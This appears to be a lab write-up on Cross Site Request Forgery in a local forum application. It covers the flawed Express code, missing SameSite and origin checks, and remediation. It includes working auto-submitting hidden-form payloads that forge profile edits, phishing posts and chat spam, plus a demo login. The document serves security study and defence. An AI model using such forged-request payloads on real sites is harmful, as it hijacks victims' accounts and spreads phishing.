# Cross Site Request Forgery Vulnerability Documentation:

## 1. Vulnerability Overview:
1. Problem Definition: Cross Site Request Forgery exploits the fundamental browser mechanism where authenticated session cookies are automatically attached to outgoing HTTP requests regardless of origin.
2. Ambient Credential Exploitation: When an authenticated user visits an external malicious web page, that page can silently trigger unauthorized state changing actions against the target application.
3. High Threat Impact: Attackers can forge requests to modify user profile details, alter account credentials, publish unauthorized discussions, or perform administrative actions on behalf of the victim.

## 2. Root Cause Code Analysis in Version 1:

### 2.1 Missing Anti CSRF Synchronizer Tokens:
1. In file `server/routes/auth.js`, the profile update endpoint processes incoming POST and PUT requests relying solely on the presence of `session_token`.
2. Code Snippet.
```javascript
const handleProfileUpdate = (req, res) => {
  if (!req.user) {
    return res.status(401).json({ error: 'Authentication required.' });
  }
  const { full_name, bio } = req.body;
  const db = getDB();
  db.prepare('UPDATE users SET full_name = ?, bio = ? WHERE id = ?').run(
    full_name || req.user.full_name,
    bio !== undefined ? bio : req.user.bio,
    req.user.id
  );
  return res.json({ message: 'Profile updated successfully' });
};
router.post('/profile', authenticate, handleProfileUpdate);
```
3. Vulnerability Flaw: The server performs zero token comparison, meaning any valid cookie holder can be coerced into submitting state changes.

### 2.2 Unrestricted Cookie SameSite Configuration:
1. In file `server/routes/auth.js`, session cookies are issued without `SameSite=Strict` enforcement.
2. Code Snippet.
```javascript
res.cookie('session_token', token, {
  path: '/'
});
```
3. Vulnerability Flaw: The browser automatically includes the `session_token` cookie when submitting cross origin HTML forms targeting `http://localhost:3000`.

### 2.3 Absent Origin and Referer Header Validation:
1. In file `server/server.js`, the server accepts incoming requests without verifying whether the request was initiated from the trusted application origin.
2. Vulnerability Flaw: External web pages hosted on separate domains or local ports can freely dispatch requests to the forum backend without being blocked.

## 3. Step by Step Attack Demonstration Walkthrough:

### 3.1 Step 1: Legitimate User Authentication:
1. An administrator or community contributor logs into the platform using username `mridankan` and password `mridankan123`.
2. The browser receives the active session identifier and stores it in the cookie jar for `localhost:3000`.

### 3.2 Step 2: Attacker Exploit Webpage Setup:
1. The attacker creates an external deceptive webpage `attacker_csrf_exploit.html` containing an invisible HTML form with forged input fields.
```html
<form id="exploit" action="http://localhost:3000/api/auth/profile" method="POST">
  <input type="hidden" name="full_name" value="Mridankan Mandal (Hijacked via CSRF)" />
  <input type="hidden" name="bio" value="Account profile compromised via Cross Site Request Forgery." />
</form>
<script>
  window.onload = function() { document.getElementById('exploit').submit(); };
</script>
```

### 3.3 Step 3: Victim Lured to Attacker Portal:
1. The victim opens the attacker link while keeping their authenticated forum session active in the background.

### 3.4 Step 4: Silent Request Transmission:
1. The attacker webpage automatically triggers form submission to `http://localhost:3000/api/auth/profile`.
2. The victim browser attaches the valid `session_token` cookie automatically.

### 3.5 Step 5: Unauthorized State Modification:
1. The backend server authenticates the request through the attached session cookie and updates the victim biography without user consent.

## 4. Practical Exploit Examples and Attack Scenarios:

### 4.1 Example 1: Unauthorized Profile and Biography Modification:
1. Forged Payload.
```html
<form action="http://localhost:3000/api/auth/profile" method="POST">
  <input type="hidden" name="full_name" value="Attacker Impersonator" />
  <input type="hidden" name="bio" value="This account has been compromised by an external malicious script." />
</form>
```
2. Explanation: Modifies the user public biography to advertise malicious content or ruin user reputation across the platform.

### 4.2 Example 2: Unauthorized Discussion Creation:
1. Forged Payload.
```html
<form action="http://localhost:3000/api/posts" method="POST">
  <input type="hidden" name="title" value="Important Society Announcement" />
  <input type="hidden" name="category" value="Announcements" />
  <input type="hidden" name="content" value="Click here to claim fake campus gift cards: http://phishing.example.com" />
</form>
```
2. Explanation: Abuses the victim administrative privileges to publish spam or phishing links directly into the announcements section.

### 4.3 Example 3: Live Community Chat Spam Injection:
1. Forged Payload.
```html
<form action="http://localhost:3000/api/chat" method="POST">
  <input type="hidden" name="message" value="Automated spam transmitted through cross origin forged request." />
</form>
```
2. Explanation: Injects unauthorized messages into the live community chat stream on behalf of the logged in user.

## 5. Summary of Remediation Strategy for Version 2:
1. Anti CSRF Synchronizer Tokens: Issue unique cryptographically secure tokens per session and require them in custom headers on all state changing requests.
2. SameSite Strict Cookie Policy: Enforce `sameSite: 'strict'` on session cookies to block ambient cookie attachment on cross origin requests.
3. Origin and Referer Whitelisting: Implement middleware to strictly validate incoming request origins before processing state changing operations.
